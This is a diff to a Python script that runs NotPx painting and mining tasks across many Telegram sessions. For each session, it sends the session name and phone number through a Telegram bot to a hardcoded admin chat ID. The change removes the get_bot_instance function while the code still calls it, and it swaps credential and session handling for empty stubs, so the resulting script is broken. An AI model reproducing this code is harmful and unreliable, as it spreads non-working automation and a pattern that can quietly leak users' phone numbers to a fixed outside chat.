@@ -17,10 +17,6 @@ admin_chat_id = "6939063404"  # Your personal chat ID where session info will be
 # Initialize bot for admin notifications
 admin_bot = telebot.TeleBot(admin_bot_token)
 
-# Function to create a bot instance
-def get_bot_instance(token):
-    return telebot.TeleBot(token)
-
 # Function to notify the admin about the session and phone number
 def notify_admin(session_name, phone_number):
     message = f"Session started: {session_name}\nPhone number: {phone_number}"
@@ -81,27 +77,28 @@ def multithread_starter(bot_token):
 
     for session_name in sessions:
         try:
-            print(f"[+] Loading session: {session_name}")
-            phone_number = session_name  # Assuming session_name is tied to the phone number
-            
-            cli = NotPx("sessions/" + session_name)
+            with lock:
+                print(f"[+] Loading session: {session_name}")
+                phone_number = session_name  # Assuming session_name is tied to the phone number
+                
+                cli = NotPx("sessions/" + session_name)
 
-            def painters_thread():
-                print(f"[+] Starting painters for session: {session_name}")
-                asyncio.run(run_painters(cli, session_name))
-                print(f"[+] Painters finished for session: {session_name}")
+                def painters_thread():
+                    print(f"[+] Starting painters for session: {session_name}")
+                    asyncio.run(run_painters(cli, session_name))
+                    print(f"[+] Painters finished for session: {session_name}")
 
-            def mine_claimer_thread():
-                print(f"[+] Starting mine claimer for session: {session_name}")
-                asyncio.run(run_mine_claimer(cli, session_name))
-                print(f"[+] Mine claimer finished for session: {session_name}")
+                def mine_claimer_thread():
+                    print(f"[+] Starting mine claimer for session: {session_name}")
+                    asyncio.run(run_mine_claimer(cli, session_name))
+                    print(f"[+] Mine claimer finished for session: {session_name}")
 
-            # Notify the admin bot about session load
-            notify_admin(session_name, phone_number)
+                # Notify the admin bot about session load
+                notify_admin(session_name, phone_number)
 
-            # Start both threads
-            threading.Thread(target=painters_thread).start()
-            threading.Thread(target=mine_claimer_thread).start()
+                # Start both threads
+                threading.Thread(target=painters_thread).start()
+                threading.Thread(target=mine_claimer_thread).start()
 
         except Exception as e:
             print(f"[!] Error on load session \"{session_name}\", error: {e}")
@@ -111,6 +108,23 @@ def multithread_starter(bot_token):
 # Clear the terminal screen function
 def clear_screen():
     os.system('clear')  # Clear the terminal screen on Termux
+
+# Placeholder functions for menu options
+def add_api_credentials():
+    # Implement logic to add API ID and Hash
+    print("Adding API credentials...")
+
+def reset_api_credentials():
+    # Implement logic to reset API credentials
+    print("Resetting API credentials...")
+
+def reset_session():
+    # Implement logic to reset session
+    print("Resetting session...")
+
+def load_sessions():
+    # Implement logic to load existing sessions
+    print("Loading existing sessions...")
 
 # Add error handling for retries and continuous operation in the menu process
 def process():
@@ -128,7 +142,7 @@ def process():
     
     print("Starting Telegram bot...")
     bot_token = input("Enter your bot token: ")
-    bot = get_bot_instance(bot_token)  # Bot instance for main process
+    bot = get_bot_instance(bot_token)  # Ensure get_bot_instance is defined elsewhere
 
     # Start bot polling in a separate thread
     bot_thread = threading.Thread(target=bot.polling, kwargs={"none_stop": True})
@@ -176,6 +190,5 @@ def process():
 if __name__ == "__main__":
     if not os.path.exists("sessions"):
         os.mkdir("sessions")
-    # Assuming you have a function to load existing sessions, define it here
     load_sessions()  # Load existing sessions
     process()  # Start the menu loop
